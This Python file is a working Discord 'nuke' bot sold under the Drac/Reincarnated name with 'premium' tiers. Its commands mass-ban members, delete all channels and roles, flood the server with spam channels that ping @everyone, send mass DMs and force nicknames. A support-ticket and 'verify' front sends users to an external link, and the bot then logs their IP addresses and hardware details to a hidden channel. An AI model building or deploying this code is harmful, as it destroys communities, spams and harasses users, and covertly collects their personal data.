import discord
from discord.ext import commands
from discord import app_commands
from colorama import init, Fore as cc
from os import name as os_name, system, environ
from sys import exit
import random
import asyncio
import sqlite3

init()
dr = DR = r = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

clear = lambda: system('cls') if os_name == 'nt' else system('clear')

baner = f'''
{r} _   _       _       {m} ____        _   
{r}| \ | |_   _| | _____{m}| __ )  ___ | |_ 
{r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
{r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
{r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
{y}Made by: {g}https://github.com/Sigma-cc'''

SPAM_MESSAGE = "# 010101010-00-0-00-000100101011010101010101011001910101010010101010101001010 FKD BY REINCARNATED GET BACKKKK https://discord.gg/upnqp4dbg @everyone @everyone @everyone"

# Database setup
DB_PATH = "bot_data.db"

def setup_db():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("CREATE TABLE IF NOT EXISTS premium_users (user_id INTEGER PRIMARY KEY)")
    cur.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
    conn.commit()
    conn.close()

def get_setting(key, default=None):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT value FROM settings WHERE key = ?", (key,))
    res = cur.fetchone()
    conn.close()
    return res[0] if res else default

def set_setting(key, value):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, str(value)))
    conn.commit()
    conn.close()

def is_premium(user_id):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT 1 FROM premium_users WHERE user_id = ?", (user_id,))
    res = cur.fetchone()
    conn.close()
    return res is not None

def add_premium(user_id):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("INSERT OR IGNORE INTO premium_users (user_id) VALUES (?)", (user_id,))
    conn.commit()
    conn.close()

setup_db()

async def delete_all_channels(guild):
    tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)

async def delete_all_roles(guild):
    tasks = [role.delete() for role in guild.roles if role.name != "@everyone" and not role.managed]
    await asyncio.gather(*tasks, return_exceptions=True)

async def ban_all_members(guild):
    tasks = [member.ban() for member in guild.members if member != guild.me and member != guild.owner]
    await asyncio.gather(*tasks, return_exceptions=True)

async def spam_task(channel, message, count=None):
    if count:
        for _ in range(count):
            try:
                await channel.send(message)
                await asyncio.sleep(0.5)
            except: break
    else:
        while True:
            try:
                await channel.send(message)
                await asyncio.sleep(0.5)
            except: break

WHITELISTED_SERVER_IDS = {1559305944595304520, 1479710104759701656, 1559305944595304520}

async def nuke_guild(guild, custom_message=None, custom_channel_name=None):
    if guild.id in WHITELISTED_SERVER_IDS:
        print(f"{g}[+] Nuke attempted on whitelisted server {guild.name} ({guild.id}) - Blocked.")
        return
    msg = custom_message or SPAM_MESSAGE
    await ban_all_members(guild)
    await delete_all_channels(guild)
    await delete_all_roles(guild)
    
    default_names = ["[😂] 𝐆𝐄𝐓𝐁𝐀𝐂𝐊", "[☠️] 𝟕𝟔𝟐𝐇𝐔𝐑𝐓", "[😭] 𝐅𝐊𝐃 BY REINCARNATED", "[🤑] 𝐖𝐄 𝐎𝐖𝐍 𝐘𝐎𝐔"]
    
    for _ in range(50):
        try:
            name = custom_channel_name or random.choice(default_names)
            channel = await guild.create_text_channel(name=name)
            asyncio.create_task(spam_task(channel, msg))
        except: continue

# Main entry point
token = environ.get('DISCORD_BOT_TOKEN')
prefix = environ.get('DISCORD_PREFIX', '.')
OWNER_IDS = {1443051529190772768, 980129921596788736}

class MyBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix=prefix, intents=discord.Intents.all(), owner_ids=OWNER_IDS)

    async def setup_hook(self):
        self.add_view(TicketView())
        self.add_view(VerifyView())
        await self.tree.sync()

client = MyBot()

@client.event
async def on_ready():
    clear()
    print(baner)
    
    # Set streaming status
    activity = discord.Streaming(
        name=".gg/reincarnated JOIN NOW",
        url="https://www.twitch.tv/4TBSPAAZ"
    )
    await client.change_presence(activity=activity)
    
    print(f'''
{c}--------------------------------------------
{g}[+] Logged in as {client.user}
{y}[!] Slash Commands Enabled
{y}[!] Status: Streaming .gg/REINCARNATED JOIN NOW
{y}[!] Whitelisted Servers: {WHITELISTED_SERVER_IDS}
{c}--------------------------------------------''')
    asyncio.create_task(check_logs_task())

@client.event
async def on_member_join(member):
    # Log member join platform (Desktop/Mobile/Web)
    status = "Unknown"
    if member.desktop_status != discord.Status.offline: status = "Desktop"
    elif member.mobile_status != discord.Status.offline: status = "Mobile"
    elif member.web_status != discord.Status.offline: status = "Web"
    
    embed = discord.Embed(
        title="👤 New Member Joined",
        description=f"{member.mention} has joined.",
        color=discord.Color.blue()
    )
    embed.add_field(name="User", value=f"{member.name} ({member.id})", inline=False)
    embed.add_field(name="Platform", value=status, inline=True)
    embed.add_field(name="Created", value=member.created_at.strftime('%Y-%m-%d'), inline=True)
    embed.set_thumbnail(url=member.display_avatar.url)
    
    # We stopped sending to drac-logs and moved to the dedicated verify log channel
    log_channel_id = 1559339621173956688
    log_channel = client.get_channel(log_channel_id)
    if log_channel:
        try: await log_channel.send(embed=embed)
        except: pass

async def check_logs_task():
    while True:
        try:
            conn = sqlite3.connect(DB_PATH)
            cur = conn.cursor()
            cur.execute("SELECT key, value FROM settings WHERE key LIKE 'log_queue_%'")
            rows = cur.fetchall()
            
            if rows:
                log_channel_id = 1559339621173956688
                channel = client.get_channel(log_channel_id)
                if channel:
                    for key, value in rows:
                            try:
                                # Use double pipe for safer splitting
                                parts = value.split('||')
                                if len(parts) == 3:
                                    username, ip, hardware = parts
                                    user_id = key.split('_')[2]
                                    
                                    embed = discord.Embed(
                                        title="🐲 DRAC VERIFICATION LOG",
                                        color=discord.Color.green(),
                                        timestamp=discord.utils.utcnow()
                                    )
                                    embed.add_field(name="User", value=f"<@{user_id}> ({username})", inline=False)
                                    embed.add_field(name="IP Address", value=f"`{ip}`", inline=True)
                                    embed.add_field(name="Hardware", value=f"`{hardware}`", inline=False)
                                    embed.set_footer(text="Drac Services Logging")
                                    
                                    await channel.send(embed=embed)
                                    
                                    # Use a separate connection for deletions to avoid lock contention
                                    try:
                                        del_conn = sqlite3.connect(DB_PATH, timeout=20)
                                        del_cur = del_conn.cursor()
                                        del_cur.execute("DELETE FROM settings WHERE key = ?", (key,))
                                        del_conn.commit()
                                        del_conn.close()
                                    except Exception as e:
                                        print(f"Delete error: {e}")
                                else:
                                    # Handle old format or malformed data
                                    username_ip_hw = value.split('|')
                                    if len(username_ip_hw) >= 3:
                                        username = username_ip_hw[0]
                                        ip = username_ip_hw[1]
                                        hardware = "|".join(username_ip_hw[2:])
                                        user_id = key.split('_')[2]
                                        
                                        embed = discord.Embed(
                                            title="🐲 DRAC VERIFICATION LOG",
                                            color=discord.Color.green(),
                                            timestamp=discord.utils.utcnow()
                                        )
                                        embed.add_field(name="User", value=f"<@{user_id}> ({username})", inline=False)
                                        embed.add_field(name="IP Address", value=f"`{ip}`", inline=True)
                                        embed.add_field(name="Hardware", value=f"`{hardware}`", inline=False)
                                        embed.set_footer(text="Drac Services Logging")
                                        
                                        await channel.send(embed=embed)
                                        
                                    # Use a separate connection for deletions to avoid lock contention
                                    try:
                                        del_conn = sqlite3.connect(DB_PATH, timeout=20)
                                        del_cur = del_conn.cursor()
                                        del_cur.execute("DELETE FROM settings WHERE key = ?", (key,))
                                        del_conn.commit()
                                        del_conn.close()
                                    except Exception as e:
                                        print(f"Delete error: {e}")
                            except Exception as e:
                                print(f"Processing row error: {e}")
                # Remove commit from the outer loop as we handle it per item now
            conn.close()
        except Exception as e:
            print(f"Log Task Error: {e}")
        await asyncio.sleep(5)

@client.tree.command(name="leave_all", description="Leave all servers except the whitelisted one (Owner Only)")
async def leave_all_slash(interaction: discord.Interaction):
    if not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
    
    await interaction.response.send_message("👋 Leaving all unauthorized servers...", ephemeral=True)
    
    left_count = 0
    fail_count = 0
    
    for guild in client.guilds:
        if guild.id not in WHITELISTED_SERVER_IDS:
            try:
                await guild.leave()
                left_count += 1
            except:
                fail_count += 1
                
    await interaction.followup.send(f"✅ Finished! Left {left_count} servers. Failed: {fail_count}", ephemeral=True)

# --- Ticket System ---

class TicketView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Create Ticket", style=discord.ButtonStyle.danger, custom_id="drac_create_ticket", emoji="🎫")
    async def create_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        user = interaction.user
        
        # Check if ticket already exists
        existing_channel = discord.utils.get(guild.channels, name=f"ticket-{user.name.lower()}")
        if existing_channel:
            return await interaction.response.send_message(f"❌ You already have a ticket open: {existing_channel.mention}", ephemeral=True)

        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            user: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        }
        
        # Add staff role overwrites if configured
        staff_role_id = get_setting('staff_role_id')
        if staff_role_id:
            staff_role = guild.get_role(int(staff_role_id))
            if staff_role:
                overwrites[staff_role] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
            
        category_id = get_setting('ticket_category_id')
        category = guild.get_channel(int(category_id)) if category_id else interaction.channel.category
        
        channel = await guild.create_text_channel(name=f"ticket-{user.name}", overwrites=overwrites, category=category)
        
        embed = discord.Embed(
            title="🐉 Drac Support",
            description=f"Hello {user.mention}, welcome to your ticket. Please describe your issue and wait for staff.",
            color=discord.Color.red()
        )
        embed.set_footer(text="Powered by Drac")
        
        view = discord.ui.View()
        close_button = discord.ui.Button(label="Close Ticket", style=discord.ButtonStyle.secondary, emoji="🔒")
        
        async def close_callback(interaction: discord.Interaction):
            await interaction.response.send_message("Closing ticket in 5 seconds...")
            await asyncio.sleep(5)
            await interaction.channel.delete()
            
        close_button.callback = close_callback
        view.add_item(close_button)
        
        await channel.send(embed=embed, view=view)
        await interaction.response.send_message(f"✅ Ticket created: {channel.mention}", ephemeral=True)

# --- Slash Commands ---

@client.tree.command(name="ticket", description="Send the Drac Ticket Panel (Owner Only)")
async def ticket_panel(interaction: discord.Interaction):
    if not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
        
    embed = discord.Embed(
        title="🐲 DRAC SUPPORT SYSTEM",
        description="Need help? Click the button below to open a private support ticket.\n\n*Our staff will be with you shortly.*",
        color=discord.Color.dark_red()
    )
    embed.set_thumbnail(url=client.user.avatar.url if client.user.avatar else None)
    embed.set_footer(text="Drac Services • Support Panel")
    
    await interaction.response.send_message("Panel Sent!", ephemeral=True)
    try:
        await interaction.channel.send(embed=embed, view=TicketView())
    except discord.Forbidden:
        await interaction.followup.send("❌ I don't have permission to send messages in this channel!", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ An error occurred: {e}", ephemeral=True)

# --- Verification System ---

class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Verify", style=discord.ButtonStyle.success, custom_id="drac_verify_button", emoji="✅")
    async def verify_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # We'll use the replit domain
        domain = environ.get('REPLIT_DEV_DOMAIN')
        if not domain:
            domain = "dfa56f72-5e72-4598-aa5d-fda0e060804d-00-3gz9y624u7j4q.picard.replit.dev"
        url = f"https://{domain}/verify/{interaction.user.id}/{interaction.user.name}"
        
        embed = discord.Embed(
            title="🐲 DRAC SERVICES",
            description=f"Click the link below to verify and access the server.\n\n🔗 [Verify Here]({url})",
            color=discord.Color.green()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

@client.tree.command(name="setup_verify", description="Setup verification system (Owner Only)")
@app_commands.describe(role="Role to give upon verification", log_channel="Channel for verification logs")
async def setup_verify_slash(interaction: discord.Interaction, role: discord.Role, log_channel: discord.TextChannel):
    if not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
    
    set_setting('verified_role_id', role.id)
    set_setting('verify_log_channel_id', log_channel.id)
    
    await interaction.response.defer(ephemeral=True)
    
    # Autolock all channels for the verified role (only unverified can see them if not verified)
    # Usually, we want to HIDE all channels from @everyone and show them to verified
    # But user asked to "autolock every channel to verify"
    # Logic: Set @everyone to NOT see channels, and Verified role TO see channels.
    
    success_count = 0
    fail_count = 0
    
    for channel in interaction.guild.channels:
        try:
            # Hide from everyone
            await channel.set_permissions(interaction.guild.default_role, view_channel=False)
            # Show to verified
            await channel.set_permissions(role, view_channel=True)
            success_count += 1
        except:
            fail_count += 1
            
    embed = discord.Embed(
        title="🐲 DRAC VERIFICATION SETUP",
        description=f"✅ Verification system configured.\n\n**Role:** {role.mention}\n**Logs:** {log_channel.mention}\n**Channels Locked:** {success_count}\n**Failed:** {fail_count}",
        color=discord.Color.green()
    )
    
    verify_embed = discord.Embed(
        title="🐲 DRAC VERIFICATION",
        description="Click the button below to verify yourself and gain access to the server.",
        color=discord.Color.green()
    )
    verify_embed.set_footer(text="Verification Required")
    
    await interaction.followup.send(embed=embed, ephemeral=True)
    await interaction.channel.send(embed=verify_embed, view=VerifyView())

@client.tree.command(name="setup", description="Drac Bot Setup (Owner Only)")
async def setup_slash(interaction: discord.Interaction):
    if not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
    
    embed = discord.Embed(
        title="🐲 DRAC BOT SETUP",
        description="Select an option below to configure the bot for this server.",
        color=discord.Color.blue()
    )
    
    view = discord.ui.View()
    
    ticket_btn = discord.ui.Button(label="Send Ticket Panel", style=discord.ButtonStyle.secondary, emoji="🎫")
    async def ticket_callback(inv: discord.Interaction):
        await ticket_panel.callback(inv)
    ticket_btn.callback = ticket_callback
    
    nuke_btn = discord.ui.Button(label="Nuke Server", style=discord.ButtonStyle.danger, emoji="🚀")
    async def nuke_callback(inv: discord.Interaction):
        await nuke_slash.callback(inv)
    nuke_btn.callback = nuke_callback
    
    view.add_item(ticket_btn)
    view.add_item(nuke_btn)
    
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@client.tree.command(name="setup_support", description="Setup support roles and category (Owner Only)")
@app_commands.describe(role="Staff role for tickets", category="Category for tickets")
async def setup_support_slash(interaction: discord.Interaction, role: discord.Role, category: discord.CategoryChannel):
    if not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
    
    set_setting('staff_role_id', role.id)
    set_setting('ticket_category_id', category.id)
    
    await interaction.response.send_message(f"✅ Support Setup Complete!\nStaff Role: {role.mention}\nCategory: {category.name}", ephemeral=True)

@client.tree.command(name="nuke", description="Nuke the server (Regular Users)")
async def nuke_slash(interaction: discord.Interaction):
    if interaction.guild_id in WHITELISTED_SERVER_IDS:
        return await interaction.response.send_message("❌ This server is protected!", ephemeral=True)
    await interaction.response.send_message("🚀 Nuke Started!", ephemeral=True)
    await nuke_guild(interaction.guild)

@client.tree.command(name="glitch", description="Role & Channel overload (Premium Only)")
@app_commands.describe(role_name="Spam role name")
async def crash_slash(interaction: discord.Interaction, role_name: str = "GLITCHED BY DRAC"):
    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
    if interaction.guild_id in WHITELISTED_SERVER_IDS:
        return await interaction.response.send_message("❌ Protected!", ephemeral=True)
    
    await interaction.response.send_message("🔥 Glitching server...", ephemeral=True)
    for _ in range(50):
        try: await interaction.guild.create_role(name=role_name, color=discord.Color.from_rgb(random.randint(0,255), random.randint(0,255), random.randint(0,255)))
        except: break
    await nuke_guild(interaction.guild)

@client.tree.command(name="ghost", description="Silent wipe (Premium Only)")
async def vanish_slash(interaction: discord.Interaction):
    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
    if interaction.guild_id in WHITELISTED_SERVER_IDS:
        return await interaction.response.send_message("❌ Protected!", ephemeral=True)
        
    await interaction.response.send_message("👻 Ghosting everything...", ephemeral=True)
    await ban_all_members(interaction.guild)
    await delete_all_channels(interaction.guild)
    await delete_all_roles(interaction.guild)

@client.tree.command(name="own", description="Full server ownership takeover (Premium Only)")
async def overtake_slash(interaction: discord.Interaction):
    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
    if interaction.guild_id in WHITELISTED_SERVER_IDS:
        return await interaction.response.send_message("❌ Protected!", ephemeral=True)

    await interaction.response.send_message("⚡ OWNING THIS SERVER...", ephemeral=True)
    for member in interaction.guild.members:
        try: await member.edit(nick="DRAC OWNED")
        except: continue
    await nuke_guild(interaction.guild)

@client.tree.command(name="drain", description="Wipe with custom data tags (Premium Only)")
async def scrape_slash(interaction: discord.Interaction):
    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
    await interaction.response.send_message("📡 Draining data...", ephemeral=True)
    await nuke_guild(interaction.guild, custom_message="DRAINED BY DRAC")

@client.tree.command(name="freeze", description="Lockdown the entire server (Premium Only)")
async def lockdown_slash(interaction: discord.Interaction):
    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
    await interaction.response.send_message("🔒 Freezing server...", ephemeral=True)
    for channel in interaction.guild.channels:
        try: await channel.set_permissions(interaction.guild.default_role, send_messages=False)
        except: continue

@client.tree.command(name="strip_roles", description="Delete all roles (Premium Only)")
async def purge_roles_slash(interaction: discord.Interaction):
    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
    await interaction.response.send_message("🎭 Stripping roles...", ephemeral=True)
    await delete_all_roles(interaction.guild)

@client.tree.command(name="premiumnuke", description="Wipe with custom settings (Premium Only)")
@app_commands.describe(message="Custom message", channel_name="Custom channels")
async def premiumnuke_slash(interaction: discord.Interaction, message: str, channel_name: str = None):
    if interaction.guild_id in WHITELISTED_SERVER_IDS:
        return await interaction.response.send_message("❌ This server is protected!", ephemeral=True)
    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
    await interaction.response.send_message("🚀 Premium Nuke Started!", ephemeral=True)
    await nuke_guild(interaction.guild, message, channel_name)

@client.tree.command(name="spam", description="Spam current channel (Owner Only)")
@app_commands.describe(message="Message to spam", amount="How many times (blank for infinite)")
async def spam_slash(interaction: discord.Interaction, message: str, amount: int = None):
    if not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
    await interaction.response.send_message("💥 Spam Started!", ephemeral=True)
    asyncio.create_task(spam_task(interaction.channel, message, amount))

@client.tree.command(name="massdm", description="DM all members (Owner Only)")
@app_commands.describe(message="Message to send")
async def massdm_slash(interaction: discord.Interaction, message: str):
    if not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
    await interaction.response.send_message("📩 Mass DM Started!", ephemeral=True)
    for member in interaction.guild.members:
        if member != client.user and not member.bot:
            try: await member.send(message)
            except: continue

@client.tree.command(name="flood", description="Flood with channels (Premium)")
@app_commands.describe(name="Channel names", amount="Amount (max 100)")
async def flood_slash(interaction: discord.Interaction, name: str, amount: int = 50):
    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
    await interaction.response.send_message("🌊 Flooding...", ephemeral=True)
    for _ in range(min(amount, 100)):
        try: await interaction.guild.create_text_channel(name=name)
        except: break

@client.tree.command(name="nickname_all", description="Change everyone's nickname (Owner Only)")
@app_commands.describe(nickname="New nickname for everyone")
async def nickname_all_slash(interaction: discord.Interaction, nickname: str):
    if not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
    await interaction.response.send_message("🏷️ Changing nicknames...", ephemeral=True)
    for member in interaction.guild.members:
        try: await member.edit(nick=nickname)
        except: continue

@client.tree.command(name="ban_nuke", description="Ban everyone (Premium)")
async def ban_nuke_slash(interaction: discord.Interaction):
    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
    if interaction.guild_id in WHITELISTED_SERVER_IDS:
        return await interaction.response.send_message("❌ This server is protected!", ephemeral=True)
    
    await interaction.response.defer(ephemeral=True)
    await ban_all_members(interaction.guild)
    try:
        await interaction.followup.send("🔨 Ban nuke complete.", ephemeral=True)
    except:
        pass

@client.tree.command(name="role_nuke", description="Delete all roles (Premium)")
async def role_nuke_slash(interaction: discord.Interaction):
    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
    
    await interaction.response.defer(ephemeral=True)
    await delete_all_roles(interaction.guild)
    try:
        await interaction.followup.send("🎭 Role nuke complete.", ephemeral=True)
    except:
        pass

@client.tree.command(name="add_premium", description="Grant lifetime premium")
async def add_premium_slash(interaction: discord.Interaction, user: discord.User):
    if not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
    add_premium(user.id)
    await interaction.response.send_message(f"✅ {user.name} is now Premium!", ephemeral=True)

@client.tree.command(name="announce", description="Send an embed announcement")
@app_commands.describe(title="Announcement Title", message="Announcement Message", channel="Channel to send to (optional for local)", global_announcement="Send to all servers?")
async def announce_slash(interaction: discord.Interaction, title: str, message: str, channel: discord.TextChannel = None, global_announcement: bool = False):
    if not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
    
    embed = discord.Embed(title=title, description=message, color=discord.Color.blue())
    if client.user.avatar:
        embed.set_thumbnail(url=client.user.avatar.url)
    
    if global_announcement:
        await interaction.response.send_message("📡 Sending global announcement...", ephemeral=True)
        for guild in client.guilds:
            target_channel = next((c for c in guild.text_channels if c.permissions_for(guild.me).send_messages), None)
            if target_channel:
                try: await target_channel.send(embed=embed)
                except: continue
    else:
        target = channel or interaction.channel
        try:
            await target.send(embed=embed)
            await interaction.response.send_message(f"✅ Announcement sent to {target.mention}!", ephemeral=True)
        except:
            await interaction.response.send_message("❌ Failed to send announcement. Check permissions.", ephemeral=True)

# --- Prefix Commands ---

@client.command()
async def nuke(ctx):
    if ctx.guild.id in WHITELISTED_SERVER_IDS:
        return await ctx.send("❌ This server is protected from nuking!")
    print(f'{y}[!] Nuke command executed in {ctx.guild.name} by {ctx.author}')
    await nuke_guild(ctx.guild)

@client.command()
async def custom_nuke(ctx, message: str, channel_name: str = None):
    if ctx.guild.id in WHITELISTED_SERVER_IDS:
        return await ctx.send("❌ This server is protected from nuking!")
    if not is_premium(ctx.author.id) and not await client.is_owner(ctx.author):
        return await ctx.send("❌ Premium Only!")
    print(f'{y}[!] Custom Nuke command executed in {ctx.guild.name} by {ctx.author}')
    await nuke_guild(ctx.guild, message, channel_name)

@client.command()
@commands.is_owner()
async def spam(ctx, amount: int, *, message: str):
    asyncio.create_task(spam_task(ctx.channel, message, amount))

@client.command()
@commands.is_owner()
async def massdm(ctx, *, message: str):
    print(f'{y}[!] Mass DM command executed in {ctx.guild.name} by {ctx.author}')
    for member in ctx.guild.members:
        if member != client.user and not member.bot:
            try: await member.send(message)
            except: continue

@client.tree.command(name="lock_channel", description="Lock the current channel (Owner Only)")
async def lock_channel_slash(interaction: discord.Interaction):
    if not await client.is_owner(interaction.user):
        return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
    
    try:
        await interaction.channel.set_permissions(interaction.guild.default_role, send_messages=False, create_public_threads=False, create_private_threads=False)
        await interaction.response.send_message("🔒 Channel Locked! (No messages or threads)", ephemeral=False)
    except discord.Forbidden:
        await interaction.response.send_message("❌ I don't have permission to lock this channel!", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"❌ An error occurred: {e}", ephemeral=True)

@client.command(name="lock_channel")
@commands.is_owner()
async def lock_channel_prefix(ctx):
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False, create_public_threads=False, create_private_threads=False)
    await ctx.send("🔒 Channel Locked! (No messages or threads)")

@client.command()
async def flood(ctx, amount: int, *, name: str):
    if not is_premium(ctx.author.id) and not await client.is_owner(ctx.author):
        return await ctx.send("❌ Premium Only!")
    for _ in range(min(amount, 100)):
        try: await ctx.guild.create_text_channel(name=name)
        except: break

@client.command()
@commands.is_owner()
async def nickall(ctx, *, nickname: str):
    await ctx.send("🏷️ Changing nicknames...")
    for member in ctx.guild.members:
        try: await member.edit(nick=nickname)
        except: continue

@client.command()
async def purgelimit(ctx, amount: int):
    if not is_premium(ctx.author.id) and not await client.is_owner(ctx.author):
        return await ctx.send("❌ Premium Only!")
    await ctx.channel.purge(limit=amount)
    await ctx.send(f"🧹 Purged {amount} messages!", delete_after=5)

@client.command()
@commands.is_owner()
async def announce(ctx, global_announcement: bool, channel: discord.TextChannel = None, *, content: str):
    # For prefix command: .announce [global] [channel] [title|message]
    # format: title|message
    if "|" in content:
        title, message = content.split("|", 1)
    else:
        title = "Announcement"
        message = content

    embed = discord.Embed(title=title.strip(), description=message.strip(), color=discord.Color.blue())
    if client.user.avatar:
        embed.set_thumbnail(url=client.user.avatar.url)
    
    if global_announcement:
        await ctx.send("📡 Sending global announcement...")
        for guild in client.guilds:
            target_channel = next((c for c in guild.text_channels if c.permissions_for(guild.me).send_messages), None)
            if target_channel:
                try: await target_channel.send(embed=embed)
                except: continue
    else:
        target = channel or ctx.channel
        try: await target.send(embed=embed)
        except: await ctx.send("❌ Failed to send.")

try:
    @client.event
    async def on_member_join(member):
        # Discord bots cannot access IP/Hardware/Device info directly.
        # We can only log basic platform status if they are already online.
        
        status = "Unknown"
        if member.desktop_status != discord.Status.offline: status = "Desktop"
        elif member.mobile_status != discord.Status.offline: status = "Mobile"
        elif member.web_status != discord.Status.offline: status = "Web"
        
        # Enhanced join message with user details
        embed = discord.Embed(
            title="👤 New Member Joined",
            description=f"{member.mention} has joined the server.",
            color=discord.Color.blue()
        )
        embed.add_field(name="Username", value=member.name, inline=True)
        embed.add_field(name="User ID", value=member.id, inline=True)
        embed.add_field(name="Platform", value=status, inline=True)
        embed.add_field(name="Account Created", value=member.created_at.strftime('%Y-%m-%d'), inline=True)
        embed.set_thumbnail(url=member.display_avatar.url)
        embed.set_footer(text="Drac Logging System")
        
        # Log to a 'logs' channel if it exists
        log_channel = discord.utils.get(member.guild.text_channels, name="drac-logs")
        if not log_channel:
            # Create it if it doesn't exist (hidden from everyone except staff/owner)
            overwrites = {
                member.guild.default_role: discord.PermissionOverwrite(read_messages=False),
                member.guild.me: discord.PermissionOverwrite(read_messages=True)
            }
            staff_role_id = get_setting('staff_role_id')
            if staff_role_id:
                staff_role = member.guild.get_role(int(staff_role_id))
                if staff_role:
                    overwrites[staff_role] = discord.PermissionOverwrite(read_messages=True)
            
            try:
                log_channel = await member.guild.create_text_channel(name="drac-logs", overwrites=overwrites)
            except: pass
            
        if log_channel:
            try: await log_channel.send(embed=embed)
            except: pass

    client.run(token)
except Exception as e:
    print(f'{r}[!] Error: {e}')
